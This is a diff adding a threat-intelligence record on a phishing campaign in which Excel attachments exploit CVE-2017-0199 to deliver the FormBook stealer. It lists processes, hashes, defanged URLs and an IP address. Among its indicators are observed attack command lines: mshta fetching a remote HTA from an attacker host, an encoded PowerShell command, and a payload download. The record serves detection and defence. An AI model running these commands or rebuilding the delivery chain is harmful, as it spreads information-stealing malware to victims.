@@ -1,0 +1,59 @@
+description: A high-severity phishing campaign targeting Windows users leverages malicious
+  Excel attachments exploiting CVE-2017-0199 to deploy the FormBook information-stealing
+  malware.
+attribution: Unknown
+malware_families:
+- FormBook
+TTPs:
+  processes:
+  - mshta.exe
+  - cmd.exe
+  - powershell.exe
+  - CallWindowProc
+  commandline:
+  - mshta.exe "hxxp://172.245.123.32/xampp/hh/wef.hta"
+  - cmd.exe /c start "" "%TEMP%\springmaker"
+  - powershell.exe -EncodedCommand 33A1696D69874AD86501F739A0186F0E4C0301B5A45D73DA903F91539C0DB427
+  - CallWindowProc
+  powershell:
+  - -EncodedCommand 33A1696D69874AD86501F739A0186F0E4C0301B5A45D73DA903F91539C0DB427
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: mshta.exe
+    destination_address: 172.245.123.32
+    port: ''
+    url: hxxp://172.245.123.32/xampp/hh/wef.hta
+  - executable: sihost.exe
+    destination_address: 172.245.123.32
+    port: ''
+    url: hxxp://172.245.123.32/199/sihost.exe[AprilSAO2025.xls]
+  file_activity:
+  - '%TEMP%\springmaker'
+  - C:\Users\<user>\AppData\Roaming\<random_name>.exe
+  - wef.hta
+  - sihost.exe[AprilSAO2025.xls]
+  persistence:
+  - The malware places a file in the %APPDATA% directory and executes it.
+  pipes: []
+  process_relations:
+  - Email Attachment (Excel) -> mshta.exe -> sihost.exe -> springmaker -> FormBook
+IOCs:
+- hash: 33A1696D69874AD86501F739A0186F0E4C0301B5A45D73DA903F91539C0DB427
+  file_name: wef.hta
+- hash: 2BFBF6792CA46219259424EFBBBEE09DDBE6AE8FD9426C50AA0326A530AC5B14
+  file_name: siHOST.exe
+- hash: 7E16ED31277C31C0370B391A1FC73F77D7F0CD13CC3BAB0EAA9E2F303B6019AF
+  file_name: springmaker
+- hash: A619B1057BCCB69C4D00366F62EBD6E969935CCA65FA40FDBFE1B95E36BA605D
+  file_name: '[FormBook / Decrypted springmaker]'
+- hash: 3843F96588773E2E463A4DA492C875B3241A4842D0C087A19C948E2BE0898364
+  file_name: FormBook
+- ip: 172.245.123.32
+- url: hxxp://172.245.123.32/xampp/hh/wef.hta
+- url: hxxp://172.245.123.32/199/sihost.exe[AprilSAO2025.xls]
+authors:
+- Shiyin Lin
+reference: https://www.fortinet.com/blog/threat-research/how-a-malicious-excel-file-cve-2017-0199-delivers-the-formbook-payload
+date_of_publication: June 05, 2025
+file_creation_date: June 08, 2025
